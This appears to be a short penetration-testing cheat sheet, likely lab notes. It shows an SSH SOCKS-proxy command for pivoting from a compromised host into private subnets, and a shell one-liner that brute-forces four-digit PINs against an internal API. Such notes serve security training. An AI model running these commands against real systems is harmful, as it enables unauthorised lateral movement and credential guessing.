# Pivoting

## If you've owned a box, how can you pivot to other machines in private subnets?
SOCKS Proxy
```
ssh weytechuser@files.wey-tech.com -D 9050 -f -N
```
Use proxychains to force any command we run locally to route all traffic through our SOCKS tunnel so that we can hit targets

Configure Firefox to run through the proxy. A good addon is SmartProxy and you can configure the SOCKS4 Protocol proxy using the localhost port set above.

## What's a way to brute-force attempt pins on an API?
```
$ ssh weytechuser@files.wey-tech.com 'for i in $(seq 1000 9999); do RESULT=$(curl http://10.4.4.80/api/confirm/abcd/$i 2>/dev/null); if [[ $RESULT == *"true"* ]]; then echo -e "\n$RESULT\nPincode: $i\n"; break; fi; done'
```
